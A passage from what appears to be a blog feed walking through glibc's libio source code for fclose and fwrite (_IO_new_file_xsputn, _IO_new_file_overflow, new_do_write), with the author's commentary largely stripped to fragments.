0)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;_finish_IO_new_file_finish&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">    _IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><p>_IO_default_finish(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><p>_IO_un_link<code>if (fp-&gt;file._flags &amp; _IO_LINKED)</code>_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(fp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p></p><h2 id="closevtable"><a href="#closevtable" class="headerlink" title="closevtable"></a><code>close</code>vtable</h2><ul><li><code>_IO_do_write</code>vtable<code>__write</code><code>_IO_new_file_write</code></li><li><code>_IO_SYSCLOSE</code><code>_close</code><code>_IO_file_close</code></li><li><code>_IO_FINISH</code>vtable _finish<code>_IO_new_file_finish</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fwrite</title>
      <link href="/2023/04/01/IO-FILE-fwrite/"/>
      <url>/2023/04/01/IO-FILE-fwrite/</url>
      
        <content type="html"><![CDATA[<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>]=<span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./flag1&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x2F-libio-x2F-iofwrite-c-IO-fwrite"><a href="#x2F-libio-x2F-iofwrite-c-IO-fwrite" class="headerlink" title="&#x2F;libio&#x2F;iofwrite.c _IO_fwrite"></a><strong>&#x2F;libio&#x2F;iofwrite.c _IO_fwrite</strong></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CHECK_FILE</strong>flag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> _IO_fwide(__fp, __mode) \</span></span><br><span class="line"><span class="meta">  (&#123; int __result = (__mode);                              \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__result &lt; 0 &amp;&amp; ! _IO_fwide_maybe_incompatible)              \</span></span><br><span class="line"><span class="meta">       &#123;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> ((__fp)-&gt;_mode == 0)      \</span></span><br><span class="line"><span class="meta">       <span class="comment">/* We know that all we have to do is to set the flag.  */</span>      \</span></span><br><span class="line"><span class="meta">       (__fp)-&gt;_mode = -1;      \</span></span><br><span class="line"><span class="meta">     __result = (__fp)-&gt;_mode;      \</span></span><br><span class="line"><span class="meta">       &#125;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span> <span class="keyword">if</span> (__builtin_constant_p (__mode) &amp;&amp; (__mode) == 0)              \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide_maybe_incompatible ? -1 : (__fp)-&gt;_mode;          \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide (__fp, __result);                      \</span></span><br><span class="line"><span class="meta">     __result; &#125;)</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401120543002.png" alt="image-20230401120543002"></p><h3 id="-IO-sputn"><a href="#-IO-sputn" class="headerlink" title="_IO_sputn"></a>_IO_sputn</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable**__xsputn<strong></strong>libio&#x2F;fileops.c_IO_new_file_xsputn**_IO_FILE,&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          count = p - s + <span class="number">1</span>;</span><br><span class="line">          must_flush = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">    count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">     buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">     so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>fopenNULL</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401153712485.png" alt="image-20230401153712485" style="zoom:80%;"><p>if<code> if (to_do + must_flush &gt; 0)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;__overflow_IO_new_file_overflow_IO_FILE EOF(-1)&#x3D;&#x3D;<mark></mark></mark></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="x2F-libio-x2F-fileops-c-IO-new-file-overflow"><a href="#x2F-libio-x2F-fileops-c-IO-new-file-overflow" class="headerlink" title="&#x2F;libio&#x2F;fileops.c _IO_new_file_overflow"></a><strong>&#x2F;libio&#x2F;fileops.c</strong> _IO_new_file_overflow</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><p>flagEOF</p><p>_IO_CURRENTLY_PUTTING_IO_write_base</p><blockquote><p>IO_CURRENTLY_PUTTINGGNU CFILE</p><p>#define IO_CURRENTLY_PUTTING(fp) ((fp)-&gt;_IO_write_ptr - (fp)-&gt;_IO_write_base)</p></blockquote><p>IO_write_base_IO_doallocbuffwrite</p><p><mark>&#x3D;&#x3D;__doallocate_IO_file_doallocate&#x3D;&#x3D;<mark></mark></mark></p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401162158010.png" alt="image-20230401162158010" style="zoom: 80%;"><p>_IO_setgfread_</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>_<strong>read</strong>3IO_buf_base</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401164402279.png" alt="image-20230401164402279" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_backup(fp) ((fp)-&gt;_flags &amp; _IO_IN_BACKUP)</span></span><br></pre></td></tr></table></figure><p>_IO_in_backupfpwrite_IO_CURRENTLY_PUTTING </p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401171509678.png" alt="image-20230401171509678" style="zoom:80%;"><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>ch&#x3D;EOF(-1),_IO_do_write(f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p><h5 id="x2F-libio-x2F-fileops-c-IO-new-do-write"><a href="#x2F-libio-x2F-fileops-c-IO-new-do-write" class="headerlink" title="&#x2F;libio&#x2F;fileops.c**_IO_new_do_write**"></a><strong>&#x2F;libio&#x2F;fileops.c</strong>**_IO_new_do_write**</h5><p>_IO_FILE0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>todo&#x3D;&#x3D;00**_IO_new_file_xsputn**</p><p><code>if (_IO_OVERFLOW (f, EOF) == EOF)</code></p><p>blocksize</p><p><strong>do_write</strong><code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code></p><h4 id="fwrite4k1k"><a href="#fwrite4k1k" class="headerlink" title="fwrite4k1k"></a>fwrite4k1k</h4><p>do_write0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;genops.c</strong>_IO_default_xsputnsize*count</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401175400733.png" alt="image-20230401175400733"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">          <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          _IO_ssize_t i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><ul><li><p>20</p><ul><li>memcopy</li></ul></li><li><p>20</p><ul><li>for</li></ul></li></ul><p>_IO_OVERFLOW</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401182422401.png" alt="image-20230401182422401"></p><h4 id="fwrite4k1k"><a href="#fwrite4k1k" class="headerlink" title="fwrite4k1k"></a>fwrite4k1k</h4><p>do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)&#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;fileops.c</strong></p><p>new_do_writedo_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_IS_APPENDING</p><p>fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base_IO_SYSSEEK()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSEEK(FP, OFFSET, MODE) JUMP2 (__seek, FP, OFFSET, 